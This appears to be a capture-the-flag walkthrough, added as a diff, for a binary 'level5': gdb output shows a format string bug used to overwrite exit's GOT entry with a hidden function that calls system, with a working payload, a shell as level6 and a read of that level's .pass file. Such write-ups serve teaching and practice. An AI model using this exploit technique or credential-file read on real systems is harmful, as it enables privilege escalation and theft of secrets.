@@ -1,0 +1,72 @@
+(gdb) disas n
+0x080484f3 <+49>:    call   0x8048380 <printf@plt>
+0x080484f8 <+54>:    movl   $0x1,(%esp)
+0x080484ff <+61>:    call   0x80483d0 <exit@plt>
+
+We notice a call to exit after printf.
+
+We notice a non called function o() which calls /bin/sh.
+
+(gdb) i func
+0x080484a4  o
+
+(gdb) disas o
+0x080484b1 <+13>:    call   0x80483b0 <system@plt>
+0x080484b6 <+18>:    movl   $0x1,(%esp)
+0x080484bd <+25>:    call   0x8048390 <_exit@plt>
+
+Let's inspect exit:
+(gdb) x/i 0x80483d0
+0x80483d0 <exit@plt>:        jmp    *0x8049838
+
+Let's use format string vulnerability to change the jmp in exit() to a jmp to o().
+
+First, let's find the memory offset to write to :
+python -c  'print "A" * 30 + "%x " * 20' > /tmp/egg
+(gdb) r < /tmp/egg
+Starting program: /home/user/level5/level5 < /tmp/egg
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200 b7fd1ac0 b7ff37d0 41414141 41414141 
+41414141 41414141 41414141 41414141 41414141 78254141 20782520 25207825 
+78252078 20782520 25207825 78252078 20782520 25207825 78252078 
+
+The offset is 4.
+
+Launched without the exploit and no argument, the output would be :
+(gdb) x/x 0x8049838
+0x8049838 <exit@got.plt>:       0x080483d6
+(gdb) x/x 0x080483d6
+0x80483d6 <exit@plt+6>: 0x00002868
+
+Only the last 2 bytes are different (0x08049838 and 0x080484a4) so let's rewrite those.
+
+Let's convert o's last 4 bytes to a decimal value :
+
+84a4 = 33956
+
+Since we will be writing an address beforehand, we need to remove 4.
+
+Which gives us :
+
+python -c 'print "\x38\x98\x04\x08" + "%33952x%4$hn"' > /tmp/payload
+
+%h allows us to write on 2 bytes.
+
+We can check the address was written and redirects to o :
+(gdb) b main
+(gdb) b * 0x080484ff
+(gdb) r < /tmp/payload
+(gdb) c
+(gdb) c
+(gdb) x/10wx $esp:
+0xbffff4f0:     0x00000001      0x00000200      0xb7fd1ac0      0xb7ff37d0
+0xbffff500:     0x08049838      0x39333325      0x25783235      0x6e682434
+0xbffff510:     0xbfff000a      0xb7fde2d4
+(gdb) x/x 0x08049838:
+0x8049838 <exit@got.plt>:       0x080484a4
+(gdb) x/x 0x080484a4:
+0x80484a4 <o>:  0x83e58955
+
+cat /tmp/payload - | ./level5
+whoami
+level6
+cat /home/user/level6/.pass
